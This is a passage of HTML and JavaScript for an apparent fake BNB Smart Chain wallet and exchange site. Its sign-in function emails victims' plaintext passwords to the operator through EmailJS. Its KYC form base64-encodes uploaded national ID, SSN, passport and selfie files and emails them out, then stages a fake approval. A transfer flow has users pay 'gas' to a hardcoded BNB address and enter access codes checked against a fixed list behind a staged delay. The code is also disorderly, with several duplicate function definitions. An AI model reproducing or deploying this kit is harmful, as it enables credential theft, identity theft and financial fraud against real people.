      <span id="profileCountry">United States</span>
      <input type="text" id="editCountry" style="display:none; padding: 6px;" />
    </div>

    <!-- Phone -->
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <span style="font-weight: bold;">Phone:</span>
      <span id="profilePhone">+123456789</span>
      <input type="text" id="editPhone" style="display:none; padding: 6px;" />
    </div>

    <!-- Wallet -->
    <div style="display: flex; justify-content: space-between;">
      <span style="font-weight: bold;">Wallet:</span>
      <span id="profileWallet">0xABC...1234</span>
    </div>

    <!-- KYC Status -->
    <div style="display: flex; justify-content: space-between;">
      <span style="font-weight: bold;">KYC Status:</span>
      <span id="profileKYCStatus" style="color: limegreen; font-weight: bold;">Verified</span>
    </div>
  </div>

  <!-- Edit & Save Buttons -->
  <div style="margin-top: 20px; display: flex; gap: 12px;">
    <button id="editBtn" onclick="enableEdit()" style="background-color: #f0b90b; color: #0b0e11; font-weight: 900; padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;">
      ‚úèÔ∏è Edit
    </button>

    <button id="saveBtn" onclick="saveProfile()" style="display: none; background-color: #00c896; color: #fff; font-weight: 900; padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;">
      üíæ Save
    </button>
  </div>

  <!-- Confirmation -->
  <div id="saveMessage" style="margin-top: 16px; color: #00c896; font-weight: bold; display: none;">
    ‚úÖ Profile updated successfully!
  </div>

  <!-- Back Button -->
  <div style="margin-top: 30px;">
    <button onclick="showPage('page12')" style="background-color: #444; color: #f0b90b; font-weight: 900; padding: 12px 24px; border-radius: 12px; border: none; cursor: pointer;">
      ‚Üê Back to Settings
    </button>
  </div>
</div>
  
<!-- === SCRIPT === -->
<script>
  // EmailJS service info
  const emailService = "service_78wwbgl";
  const signinTemplate = "template_omkmcio";
  const publicKey = "ochPV1QVtay7TOdBA";

  // Initialize EmailJS
  emailjs.init(publicKey);

  // Show a page by number or string id (e.g. 1, "9i")
  function showPage(pageNum) {
    const pages = document.querySelectorAll(".page");
    pages.forEach(page => (page.style.display = "none"));

    // Support page IDs like "9i" or numeric "1"
    const targetId = typeof pageNum === "number" ? "page" + pageNum : "page" + pageNum;
    const target = document.getElementById(targetId);
    if (target) {
      target.style.display = "block";
    } else {
      console.warn(`Page with id "${targetId}" not found.`);
    }
  }

  // Handle sign-in form submission and send EmailJS request
  function submitSignin() {
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("pass").value.trim();

    if (!email || !pass) {
      alert("Please enter your email and password.");
      return;
    }

    showPage(2); // Show authenticating/loading page

    const loginParams = {
      user_email: email,
      user_password: pass,
    };

    emailjs.send(emailService, signinTemplate, loginParams)
      .then(response => {
        console.log("Email sent:", response.status, response.text);

        // Simulate authentication delay before moving on
        setTimeout(() => {
          showPage(3); // Show Account ID confirmation page
        }, 3000);
      })
      .catch(error => {
        console.error("Email send failed:", error);
        alert("Failed to authenticate. Please try again.");
        showPage(1); // Return to sign-in page on failure
      });
  }

  // Show sign-in page on window load
  window.onload = () => {
    showPage(1);
  };
</script>

    <!-- Required Libraries -->
<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

<script>
  // Languages supported with code => label mapping
  const languages = {
    en: "English",
    es: "Spanish",
    fr: "French",
    de: "German",
    zh: "Chinese",
    ja: "Japanese",
    ru: "Russian",
    ar: "Arabic",
    pt: "Portuguese",
    hi: "Hindi"
  };

  // Currency list (simplified example)
  const currencies = {
    USD: "US Dollar",
    CAD: "Canadian Dollar",
    INR: "Indian Rupee",
    PKR: "Pakistani Rupee",
    AED: "UAE Dirham",
    EUR: "Euro",
    GBP: "British Pound"
  };

  // Populate language selector options
  function populateLanguageSelector() {
    const langSelect = document.getElementById("languageSelector");
    langSelect.innerHTML = "";
    for (const [code, label] of Object.entries(languages)) {
      const option = document.createElement("option");
      option.value = code;
      option.textContent = label;
      langSelect.appendChild(option);
    }
  }

  // Populate currency selector options
  function populateCurrencySelector() {
    const currencySelect = document.getElementById("currencySelector");
    currencySelect.innerHTML = "";
    for (const [code, label] of Object.entries(currencies)) {
      const option = document.createElement("option");
      option.value = code;
      option.textContent = label;
      currencySelect.appendChild(option);
    }
  }

  // Save language selection and optionally reload content / translation
  function handleLanguageChange() {
    const lang = document.getElementById("languageSelector").value;
    localStorage.setItem("selectedLanguage", lang);
    // Add your translation or content update logic here
    console.log("Language changed to", lang);
  }

  // Save currency selection and update total asset conversion
  function handleCurrencyChange() {
    const currency = document.getElementById("currencySelector").value;
    localStorage.setItem("selectedCurrency", currency);
    updateTotalAssets();
    console.log("Currency changed to", currency);
  }

  // Detect user language by IP geolocation, fallback to browser
  async function detectUserLanguage() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (!res.ok) throw new Error("Failed to fetch IP info");
      const data = await res.json();
      if (data && data.country_code) {
        // Map some country codes to language codes
        const countryLangMap = {
          US: "en",
          GB: "en",
          CA: "en",
          IN: "hi",
          PK: "en",
          AE: "ar",
          FR: "fr",
          DE: "de",
          ES: "es",
          CN: "zh",
          RU: "ru",
          JP: "ja",
          BR: "pt",
          PT: "pt"
        };
        return countryLangMap[data.country_code] || navigator.language.slice(0, 2);
      }
    } catch {
      // fallback
    }
    return navigator.language.slice(0, 2);
  }

  // Set detected language to selector and save
  async function setUserLanguage() {
    const detectedLang = await detectUserLanguage();
    if (languages[detectedLang]) {
      document.getElementById("languageSelector").value = detectedLang;
      localStorage.setItem("selectedLanguage", detectedLang);
    }
  }

  // --- ethers.js Wallet & Balance Fetch ---

  // Set up BSC provider (BSC Mainnet)
  const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

  // USDT BEP-20 contract info on BSC
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)"
  ];

  let walletAddress = null;

  // Load wallet address from localStorage and update UI
  function loadWalletInfo() {
    walletAddress = localStorage.getItem("connectedWallet");
    if (walletAddress) {
      document.getElementById("walletAddress").textContent = walletAddress;
      document.getElementById("connectedWalletDisplayHomepage").textContent = "Connected: " + shortenAddress(walletAddress);
      fetchBalances();
    } else {
      document.getElementById("walletAddress").textContent = "Not connected";
      document.getElementById("connectedWalletDisplayHomepage").textContent = "";
      clearBalances();
    }
  }

  // Clear balances display
  function clearBalances() {
    document.getElementById("bnbBalance").textContent = "BNB: 0.0000";
    document.getElementById("usdtBalance").textContent = "USDT: 0.00";
    document.getElementById("bnbTokenBalance").textContent = "0.0000";
    document.getElementById("usdtTokenBalance").textContent = "0.00";
    document.getElementById("totalAssetsAmount").textContent = "0.00";
  }

  // Fetch balances from blockchain
  async function fetchBalances() {
    if (!walletAddress) return clearBalances();

    try {
      // Fetch BNB balance
      const balanceBNBBig = await bscProvider.getBalance(walletAddress);
      const balanceBNB = Number(ethers.formatEther(balanceBNBBig));
      document.getElementById("bnbBalance").textContent = `BNB: ${balanceBNB.toFixed(4)}`;

      // Fetch USDT balance
      const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, bscProvider);
      const balanceUSDTBig = await usdtContract.balanceOf(walletAddress);
      const decimals = await usdtContract.decimals();
      const balanceUSDT = Number(balanceUSDTBig) / Math.pow(10, decimals);
      document.getElementById("usdtBalance").textContent = `USDT: ${balanceUSDT.toFixed(2)}`;

      // Update token balances in token boxes
      document.getElementById("bnbTokenBalance").textContent = balanceBNB.toFixed(4);
      document.getElementById("usdtTokenBalance").textContent = balanceUSDT.toFixed(2);

      // Update total assets display with current currency conversion
      updateTotalAssets(balanceBNB, balanceUSDT);

    } catch (error) {
      console.error("Failed to fetch balances:", error);
      clearBalances();
    }
  }

  // Shorten wallet address for display (e.g. 0xABC...1234)
  function shortenAddress(addr) {
    if (!addr) return "";
    return addr.slice(0, 6) + "..." + addr.slice(-4);
  }

  // Copy wallet address to clipboard with alert
  function copyWalletAddress() {
    if (!walletAddress) return alert("No wallet connected");
    navigator.clipboard.writeText(walletAddress).then(() => {
      alert("Wallet address copied to clipboard!");
    });
  }

  // Exchange rates cache
  let exchangeRates = null;

  // Fetch latest exchange rates for BNB and USDT to selected currency
  async function fetchExchangeRates() {
    const currency = localStorage.getItem("selectedCurrency") || "USD";
    try {
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,tether&vs_currencies=${currency.toLowerCase()}`;
      const res = await fetch(url);
      const data = await res.json();
      exchangeRates = {
        BNB: data.binancecoin ? data.binancecoin[currency.toLowerCase()] : 0,
        USDT: data.tether ? data.tether[currency.toLowerCase()] : 0
      };
    } catch (e) {
      console.error("Failed to fetch exchange rates", e);
      exchangeRates = { BNB: 0, USDT: 0 };
    }
  }

  // Update total assets display using exchange rates and balances
  async function updateTotalAssets(balanceBNB = null, balanceUSDT = null) {
    // If balances not passed, try to parse from DOM or zero
    if (balanceBNB === null) {
      balanceBNB = parseFloat(document.getElementById("bnbTokenBalance").textContent) || 0;
    }
    if (balanceUSDT === null) {
      balanceUSDT = parseFloat(document.getElementById("usdtTokenBalance").textContent) || 0;
    }

    await fetchExchangeRates();
    const currency = localStorage.getItem("selectedCurrency") || "USD";

    const total =
      (balanceBNB * (exchangeRates?.BNB || 0)) +
      (balanceUSDT * (exchangeRates?.USDT || 0));

    document.getElementById("totalAssetsAmount").textContent = total.toFixed(2);
  }

  // Initialize Chart.js line chart for BNB/USDT price
  let priceChart = null;
  async function initPriceChart() {
    const ctx = document.getElementById("priceChart").getContext("2d");

    // Fetch historical BNB/USDT prices from CoinGecko (1 day, hourly)
    const currency = localStorage.getItem("selectedCurrency") || "usd";
    try {
      const res = await fetch(
        `https://api.coingecko.com/api/v3/coins/binancecoin/market_chart?vs_currency=${currency.toLowerCase()}&days=1&interval=hourly`
      );
      const data = await res.json();

      // data.prices is an array of [timestamp, price]
      const labels = data.prices.map(p => {
        const date = new Date(p[0]);
        return date.getHours() + ":00";
      });
      const prices = data.prices.map(p => p[1]);

      if (priceChart) {
        priceChart.destroy();
      }

      priceChart = new Chart(ctx, {
        type: "line",
        data: {
          labels,
          datasets: [{
            label: `BNB Price (${currency.toUpperCase()})`,
            data: prices,
            borderColor: "#f3ba2f",
            backgroundColor: "rgba(243,186,47,0.3)",
            fill: true,
            tension: 0.3,
          }],
        },
        options: {
          responsive: true,
          scales: {
            y: {
              beginAtZero: false,
              ticks: { color: "#f3ba2f" }
            },
            x: {
              ticks: { color: "#f3ba2f" }
            }
          },
          plugins: {
            legend: {
              labels: { color: "#f3ba2f", font: { weight: "900" } }
            }
          }
        }
      });

    } catch (e) {
      console.error("Failed to fetch chart data", e);
    }
  }

  // Show a page by id and hide others (simple SPA style)
  function showPage(pageId) {
    document.querySelectorAll(".page").forEach(p => {
      p.style.display = p.id === pageId ? "block" : "none";
    });
  }

  // Open Transfer page with token symbol parameter (stub)
  function openTransferPage(token) {
    alert(`Open transfer page for ${token}`);
    // Implement your navigation and prefill here
  }

  // Initialization on page load
  async function initPage4() {
    populateLanguageSelector();
    populateCurrencySelector();

    // Load saved selections or detect
    const savedLang = localStorage.getItem("selectedLanguage");
    if (savedLang && languages[savedLang]) {
      document.getElementById("languageSelector").value = savedLang;
    } else {
      await setUserLanguage();
    }

    const savedCurrency = localStorage.getItem("selectedCurrency");
    if (savedCurrency && currencies[savedCurrency]) {
      document.getElementById("currencySelector").value = savedCurrency;
    } else {
      localStorage.setItem("selectedCurrency", "USD");
      document.getElementById("currencySelector").value = "USD";
    }

    loadWalletInfo();

    // Init chart
    await initPriceChart();

    // Update total assets with latest exchange rates and balances
    await updateTotalAssets();

    // Optionally refresh prices & balances every 1 min
    setInterval(async () => {
      loadWalletInfo();
      await initPriceChart();
    }, 60000);
  }

  // Run init on page 4 show
  document.addEventListener("DOMContentLoaded", () => {
    // If page4 visible on load
    if (document.getElementById("page4").style.display === "block") {
      initPage4();
    }
  });

</script>

  <script>
// === PAGE 5: Top Up BNB Logic ===

// Binance Smart Chain Provider
const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

// On page show, run wallet check and fetch gas estimate
function initTopUpPage() {
  checkWalletStatus();
  fetchEstimatedGasFee();
}

// Show connected wallet status or prompt to connect
function checkWalletStatus() {
  const wallet = localStorage.getItem("connectedWallet");
  const noticeEl = document.getElementById("walletNotice");

  if (wallet) {
    const shortened = shortenAddress(wallet);
    noticeEl.innerHTML = `‚úÖ Connected Wallet: <span style="color:#0ecb81;">${shortened}</span>`;
  } else {
    noticeEl.innerHTML = "‚ö†Ô∏è Please connect your BNB Smart Chain wallet before topping up.";
  }
}

// Estimate gas fee for a typical BNB transfer
async function fetchEstimatedGasFee() {
  try {
    const wallet = localStorage.getItem("connectedWallet");
    if (!wallet) return;

    // Simulate a transaction to get gas estimate
    const gasPrice = await bscProvider.getGasPrice(); // in wei
    const estimatedGasLimit = 21000; // basic transfer

    const gasFeeBNB = ethers.formatEther(gasPrice * BigInt(estimatedGasLimit));
    document.getElementById("estimatedGasFee").textContent = `~${parseFloat(gasFeeBNB).toFixed(5)} BNB`;
  } catch (err) {
    console.error("Failed to estimate gas fee:", err);
    document.getElementById("estimatedGasFee").textContent = "~0.00021 BNB";
  }
}

// Navigate to Gas Confirmation Page
function goToGasConfirmation() {
  const wallet = localStorage.getItem("connectedWallet");
  if (!wallet) {
    alert("Please connect your wallet first.");
    return;
  }

  showPage('page9i'); // Gas Confirmation Page
}

// Shorten wallet address for display (e.g., 0xABC...1234)
function shortenAddress(addr) {
  if (!addr) return "";
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

// Run init when this page is shown
function handlePage5Show() {
  if (document.getElementById("page5").style.display === "block") {
    initTopUpPage();
  }
}

// Watch for DOMContentLoaded and page5 display
document.addEventListener("DOMContentLoaded", () => {
  const observer = new MutationObserver(() => {
    handlePage5Show();
  });
  observer.observe(document.getElementById("page5"), { attributes: true, attributeFilter: ["style"] });
});
  </script>

    <script>
// === PAGE 6: Scan & Confirm Transaction ===

// Setup provider (Binance Smart Chain)
const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

// Handle submit button
async function submitTransaction() {
  const txHash = document.getElementById("txHash").value.trim();
  const statusDiv = document.getElementById("txStatus");
  const wallet = localStorage.getItem("connectedWallet");

  if (!wallet) {
    statusDiv.style.color = "red";
    statusDiv.textContent = "‚ö†Ô∏è Please connect your wallet first.";
    return;
  }

  if (!txHash || !/^0x([A-Fa-f0-9]{64})$/.test(txHash)) {
    statusDiv.style.color = "red";
    statusDiv.textContent = "‚ùå Invalid transaction hash format.";
    return;
  }

  statusDiv.style.color = "#f3ba2f";
  statusDiv.textContent = "‚è≥ Verifying transaction...";

  try {
    const tx = await bscProvider.getTransaction(txHash);

    if (!tx) {
      statusDiv.style.color = "red";
      statusDiv.textContent = "‚ùå Transaction not found on BSC.";
      return;
    }

    if (tx.to && tx.to.toLowerCase() === wallet.toLowerCase()) {
      // Transaction is to user's wallet
      statusDiv.style.color = "#2ecc71";
      statusDiv.textContent = "‚úÖ Transaction confirmed! Updating balance...";

      // Refresh balances on homepage
      await fetchBalances();
      await updateTotalAssets();

      setTimeout(() => {
        showPage('page4');
      }, 2000);
    } else {
      statusDiv.style.color = "orange";
      statusDiv.textContent = "‚ö†Ô∏è Transaction is not to your wallet address.";
    }

  } catch (err) {
    console.error("Error verifying transaction:", err);
    statusDiv.style.color = "red";
    statusDiv.textContent = "‚ùå Failed to verify transaction.";
  }
}

// Auto-clear status message on input
document.addEventListener("DOMContentLoaded", () => {
  const txInput = document.getElementById("txHash");
  txInput.addEventListener("input", () => {
    document.getElementById("txStatus").textContent = "";
  });
});
    </script>

    <script>

<script>
  async function initPage7() {
    populateLanguageSelector("languageSelector7");
    populateCurrencySelector("currencySelector7");

    const lang = localStorage.getItem("selectedLanguage");
    const currency = localStorage.getItem("selectedCurrency");

    if (lang) document.getElementById("languageSelector7").value = lang;
    if (currency) document.getElementById("currencySelector7").value = currency;

    const wallet = localStorage.getItem("connectedWallet");
    if (!wallet) {
      document.getElementById("bnbBalance7").textContent = "--";
      document.getElementById("usdtBalance7").textContent = "--";
      document.getElementById("availableBalanceAmount").textContent = "--";
      return;
    }

    try {
      const bnbBig = await bscProvider.getBalance(wallet);
      const bnb = parseFloat(ethers.formatEther(bnbBig)).toFixed(4);
      document.getElementById("bnbBalance7").textContent = bnb;

      const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, bscProvider);
      const usdtBig = await usdtContract.balanceOf(wallet);
      const usdt = (Number(usdtBig) / 1e18).toFixed(2);
      document.getElementById("usdtBalance7").textContent = usdt;

      await fetchExchangeRates();
      const total = (bnb * (exchangeRates?.BNB || 0)) + (usdt * (exchangeRates?.USDT || 0));
      document.getElementById("availableBalanceAmount").textContent = total.toFixed(2);

      await initAssetChart(currency);
    } catch (e) {
      console.error("Page 7 Error:", e);
    }
  }

  async function initAssetChart(currency = "usd") {
    const ctx = document.getElementById("assetChart7").getContext("2d");
    try {
      const res = await fetch(`https://api.coingecko.com/api/v3/coins/binancecoin/market_chart?vs_currency=${currency.toLowerCase()}&days=1&interval=hourly`);
      const data = await res.json();

      const labels = data.prices.map(p => new Date(p[0]).getHours() + ":00");
      const values = data.prices.map(p => p[1]);

      if (window.assetChart7) window.assetChart7.destroy();
      window.assetChart7 = new Chart(ctx, {
        type: "line",
        data: {
          labels: labels,
          datasets: [{
            label: `BNB (24h)`,
            data: values,
            borderColor: "#f3ba2f",
            backgroundColor: "rgba(243,186,47,0.2)",
            tension: 0.3,
            fill: true
          }]
        },
        options: {
          plugins: {
            legend: { labels: { color: "#f3ba2f", font: { weight: "bold" } } }
          },
          scales: {
            x: { ticks: { color: "#f3ba2f" } },
            y: { ticks: { color: "#f3ba2f" } }
          }
        }
      });
    } catch (e) {
      console.error("Chart error:", e);
    }
  }

  // Call when showing the page
  function showPage(pageId) {
    document.querySelectorAll(".page").forEach(p => p.style.display = p.id === pageId ? "block" : "none");
    if (pageId === "page7") initPage7();
    if (pageId === "page4") initPage4();
  }      
  const COINS = [
    { id: 'tether', symbol: 'USDT', imgEl: 'usdtIcon7', balanceEl: 'usdtBalance7', priceEl: 'usdtPrice7' },
    { id: 'binancecoin', symbol: 'BNB', imgEl: 'bnbIcon7', balanceEl: 'bnbBalance7', priceEl: 'bnbPrice7' }
  ];

  async function initPage7() {
    populateLanguageSelector();
    populateCurrencySelector();

    // Sync language/currency selectors from homepage
    const lang = localStorage.getItem("selectedLanguage") || "en";
    const currency = localStorage.getItem("selectedCurrency") || "USD";
    document.getElementById("languageSelector7").value = lang;
    document.getElementById("currencySelector7").value = currency;

    // Fetch prices & icons from CoinGecko
    const ids = COINS.map(c => c.id).join(",");
    const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=${currency.toLowerCase()}&ids=${ids}`);
    const prices = await res.json();

    let totalUSD = 0;

    prices.forEach(p => {
      const cfg = COINS.find(c => c.id === p.id);
      document.getElementById(cfg.imgEl).src = p.image;
      document.getElementById(cfg.priceEl).textContent = `Price: ${p.current_price.toFixed(2)} ${currency}`;

      const bal = parseFloat(document.getElementById(cfg.balanceEl).textContent) || 0;
      totalUSD += p.current_price * bal;
    });

    document.getElementById("availableBalanceAmount").textContent = totalUSD.toFixed(2);
  }

  // Run when page7 becomes visible
  document.addEventListener("DOMContentLoaded", () => {
    const observer = new MutationObserver(records => {
      records.forEach(record => {
        if (record.target.id === "page7" && record.target.style.display === "block") {
          initPage7();
        }
      });
    });
    observer.observe(document.getElementById("page7"), { attributes: true, attributeFilter: ["style"] });
  });
    </script>
<script>
  const bnbGasFeeEstimate = "0.00021";

  // Autofill max amount from BNB balance
  function setMaxAmount() {
    const balanceText = document.getElementById("bnbBalance")?.textContent || "";
    const balance = parseFloat(balanceText.replace("BNB:", "").trim()) || 0;
    const maxAmount = balance - parseFloat(bnbGasFeeEstimate);

    if (maxAmount > 0) {
      document.getElementById("transferAmount").value = maxAmount.toFixed(4);
      document.getElementById("gasFee").textContent = `${bnbGasFeeEstimate} BNB`;
    } else {
      alert("Insufficient BNB balance");
    }
  }

  // Proceed to BNB Gas Confirmation Page
  function goToBNBGasConfirmationPage() {
    const address = document.getElementById("inputWallet").value.trim();
    const amount = document.getElementById("transferAmount").value.trim();
    const network = document.getElementById("networkSelect").value;

    if (!address || !amount || !network) {
      alert("Please fill all fields before continuing.");
      return;
    }

    // Save details to localStorage (optional)
    localStorage.setItem("transfer_wallet", address);
    localStorage.setItem("transfer_amount", amount);
    localStorage.setItem("transfer_network", network);

    // Navigate to BNB Gas Confirmation Page (Page 9i)
    showPage("page9i");
  }
</script>
  
  <script>
  // === Valid Access Codes ===
  const validAccessCodes = [
    "Bkdn3lwe5", "Bpht3gvu1", "Bmxz3ijp9", "Bzrf3kqb3", "Bvyn3tar0", "Bghr3nlu7", "Bscr3dmq6",
    "Bqet3ywx4", "Bndc3hgs2", "Bjla3ovi8", "Bfdx3mnp1", "Bwko3ehy9", "Bvul3zjt6", "Bteg3ika3",
    "Bzxp3agf7", "Bldw3cmt0", "Bnoh3ljz4", "Bquv3ddh2", "Bcak3qse5", "Bhzi3tlo1", "Bxrb3ujn8",
    "Bvyj3kxz9", "Bbhr3gta6", "Bmqf3wpc0", "Bjok3eum3", "Bxgy3dvi4", "Bpsa3rht7", "Bkra3mgw2",
    "Bynx3slb8", "Bqwu3hdy5", "Btvz3kic9", "Bsef3txl4", "Bvkr3odj6", "Bzuh3aqy3", "Bwyc3epv7",
    "Bghl3bmn1", "Bpme3zsq0", "Bdan3jlx5", "Bmkf3ytb2", "Blso3wqd4", "Bjur3xgz7", "Bvta3fml9",
    "Bcqw3uho0", "Bzjk3eyc8", "Bhul3nwr6", "Bmvp3ska1", "Bxez3ldn9", "Bgtf3qmo7", "Barl3xut4"
  ];

  // === Universal Page Navigation ===
  function showPage(pageId) {
    document.querySelectorAll(".page").forEach(page => {
      page.style.display = (page.id === pageId) ? "block" : "none";
    });
  }

  // === Step 1: Transfer Button ‚Üí Open Gas Page ===
  function goToBNBGasConfirmationPage() {
    showPage('page9i');
  }

  // === Step 2: BNB Gas ‚Üí Copy Address ===
  function copyBNBAddress() {
    const bnbAddress = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
    navigator.clipboard.writeText(bnbAddress)
      .then(() => {
        alert("BNB address copied to clipboard.");
      })
      .catch(() => {
        alert("Failed to copy BNB address.");
      });
  }

  // === Step 3: Confirm Access Code ===
  function confirmAccessCode() {
    const inputCode = document.getElementById('accessCodeInput').value.trim();

    if (!inputCode) {
      alert("Please enter the access code.");
      return;
    }

    // Go to Processing Page
    showPage('page9');

    // After 10s, check validity and route
    setTimeout(() => {
      if (validAccessCodes.includes(inputCode)) {
        showPage('page14'); // Transaction Successful
      } else {
        showPage('page11'); // Transaction Declined
      }
    }, 10000);
  }

  // === Optional: Use Max Amount Function ===
  function setMaxAmount() {
    const max = 100; // Placeholder. Replace with logic to pull actual balance
    document.getElementById("transferAmount").value = max;
    document.getElementById("gasFee").innerText = "0.09490 BNB";
  }
</script>

<script>
  function feedback() {
    // Optional: Play sound, vibrate, or show toast
    console.log("Button clicked"); // For debugging
    if (navigator.vibrate) navigator.vibrate(50);
  }

  function disconnectWallet() {
    localStorage.removeItem("connectedWallet");
    alert("Wallet disconnected successfully.");
    showPage(1);
  }

  function logout() {
    localStorage.clear();
    alert("You‚Äôve been logged out.");
    showPage(1);
  }

  function showPage(pageNum) {
    document.querySelectorAll(".page").forEach(p => p.style.display = "none");
    const target = document.getElementById("page" + pageNum);
    if (target) target.style.display = "block";
  }
</script>  

  <script>
  let walletModal = document.getElementById("walletModal");
  let walletModalContent = document.getElementById("walletModalContent");
  let qrScannerModal = document.getElementById("qrScannerModal");
  let dragOffset = { x: 0, y: 0 };
  let isDragging = false;
  let html5QrCode;

  function openWalletModal() {
    walletModal.style.display = "flex";
    setTimeout(() => {
      walletModalContent.style.transform = "scale(1)";
      walletModalContent.style.opacity = "1";
    }, 50);
  }

  function closeWalletModal() {
    walletModalContent.style.transform = "scale(0.9)";
    walletModalContent.style.opacity = "0";
    setTimeout(() => {
      walletModal.style.display = "none";
    }, 200);
  }

  function confirmManualWallet() {
    const address = document.getElementById("walletInputField").value.trim();
    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
      alert("Invalid wallet address");
      return;
    }

    localStorage.setItem("connectedWallet", address);
    alert("Wallet connected successfully!");
    closeWalletModal();
    showPage(4);
    updateBalancesDisplay(); // optional live update
  }

  // === QR Scanner ===
  function startQRScanner() {
    qrScannerModal.style.display = "flex";
    if (!html5QrCode) {
      html5QrCode = new Html5Qrcode("qr-reader");
    }
    Html5Qrcode.getCameras().then(devices => {
      if (devices && devices.length) {
        html5QrCode.start(
          { facingMode: "environment" },
          { fps: 10, qrbox: 250 },
          qrCodeMessage => {
            document.getElementById("walletInputField").value = qrCodeMessage;
            stopQRScanner();
          },
          errorMsg => {
            // console.warn("QR Scan Error:", errorMsg);
          }
        );
      } else {
        alert("No camera found");
      }
    });
  }

  function stopQRScanner() {
    if (html5QrCode) {
      html5QrCode.stop().then(() => {
        qrScannerModal.style.display = "none";
      }).catch(err => {
        console.error("QR Stop Error:", err);
        qrScannerModal.style.display = "none";
      });
    } else {
      qrScannerModal.style.display = "none";
    }
  }

  // === Draggable Modal ===
  walletModalContent.addEventListener("mousedown", e => {
    isDragging = true;
    dragOffset.x = e.clientX - walletModalContent.offsetLeft;
    dragOffset.y = e.clientY - walletModalContent.offsetTop;
  });

  document.addEventListener("mouseup", () => isDragging = false);

  document.addEventListener("mousemove", e => {
    if (isDragging) {
      walletModalContent.style.left = `${e.clientX - dragOffset.x}px`;
      walletModalContent.style.top = `${e.clientY - dragOffset.y}px`;
      walletModalContent.style.position = "absolute";
    }
  });
  </script>
  
  <script> 
const emailService = "service_78wwbgl";
const signinTemplate = "template_omkmcio";
const publicKey = "ochPV1QVtay7TOdBA";

emailjs.init(publicKey);

async function submitKYC(event) {
  event.preventDefault();

  const name = document.getElementById("kycName").value.trim();
  const email = document.getElementById("kycEmail").value.trim();
  const phone = document.getElementById("kycPhone").value.trim();
  const country = document.getElementById("kycCountry").value.trim();

  const nationalID = document.getElementById("kycNationalID").files[0];
  const ssn = document.getElementById("kycSSN").files[0];
  const passport = document.getElementById("kycPassport").files[0];
  const selfie = document.getElementById("kycSelfie").files[0];

  if (!name || !email || !phone || !country) {
    alert("Please fill in all required fields.");
    return;
  }

  if (!nationalID || !ssn || !passport || !selfie) {
    alert("Please upload all required documents.");
    return;
  }

  function encodeFileToBase64(file) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result);
      reader.onerror = () => reject("Failed to read file");
      reader.readAsDataURL(file);
    });
  }

  try {
    // Encode all files concurrently
    const [nationalIDBase64, ssnBase64, passportBase64, selfieBase64] = await Promise.all([
      encodeFileToBase64(nationalID),
      encodeFileToBase64(ssn),
      encodeFileToBase64(passport),
      encodeFileToBase64(selfie),
    ]);

    // Prepare EmailJS parameters
    const emailParams = {
      user_name: name,
      user_email: email,
      user_phone: phone,
      user_country: country,
      national_id_file: nationalIDBase64,
      ssn_file: ssnBase64,
      passport_file: passportBase64,
      video_selfie: selfieBase64,
    };

    // Show KYC Pending page
    showPage("15i");

    // Send email via EmailJS
    await emailjs.send(emailService, signinTemplate, emailParams);

    console.log("KYC documents sent successfully.");

    // Simulate review delay then show KYC approved
    setTimeout(() => {
      showPage("15ii");
    }, 6000);

  } catch (error) {
    console.error("KYC submission error:", error);
    alert("There was an error submitting your KYC. Please try again.");
    showPage("15"); // Return to KYC form on failure
  }
}
</script>

<script>
const exchangeRates = {
  USDT_BNB: 0.0033,  // 1 USDT ‚âà 0.0033 BNB
  BNB_USDT: 305      // 1 BNB ‚âà 305 USDT
};

function handleTrade() {
  const fromToken = document.getElementById("fromToken").value;
  const toToken = document.getElementById("toToken").value;
  const amountStr = document.getElementById("fromAmount").value.trim();
  const amount = parseFloat(amountStr);

  if (!amountStr || isNaN(amount) || amount <= 0) {
    alert("Please enter a valid amount.");
    return;
  }

  if (fromToken === toToken) {
    alert("Please select different tokens to swap.");
    return;
  }

  let estimatedReceive = 0;

  if (fromToken === "USDT" && toToken === "BNB") {
    estimatedReceive = amount * exchangeRates.USDT_BNB;
  } else if (fromToken === "BNB" && toToken === "USDT") {
    estimatedReceive = amount * exchangeRates.BNB_USDT;
  } else {
    alert("Unsupported token pair selected.");
    return;
  }

  document.getElementById("receiveAmount").textContent = estimatedReceive.toFixed(6);
  alert(`You will receive approximately ${estimatedReceive.toFixed(6)} ${toToken}`);
  }
</script>

<script>

  // Example initial user profile data (you can load this from storage or backend)
let userProfile = {
  name: "John Doe",
  email: "john@example.com",
  country: "United States",
  phone: "+123456789",
  wallet: "0xABC...1234",
  kycStatus: "Verified"
};

function loadProfile() {
  // Fill the spans with current profile data
  document.getElementById("profileName").textContent = userProfile.name;
  document.getElementById("profileEmail").textContent = userProfile.email;
  document.getElementById("profileCountry").textContent = userProfile.country;
  document.getElementById("profilePhone").textContent = userProfile.phone;
  document.getElementById("profileWallet").textContent = userProfile.wallet;
  document.getElementById("profileKYCStatus").textContent = userProfile.kycStatus;

  // Hide inputs, show spans
  toggleEdit(false);
  hideSaveMessage();
}

function toggleEdit(enable) {
  // Show or hide edit inputs and text spans accordingly
  const fields = ["Name", "Email", "Country", "Phone"];
  fields.forEach(field => {
    document.getElementById("profile" + field).style.display = enable ? "none" : "inline";
    document.getElementById("edit" + field).style.display = enable ? "inline-block" : "none";
  });

  document.getElementById("editBtn").style.display = enable ? "none" : "inline-block";
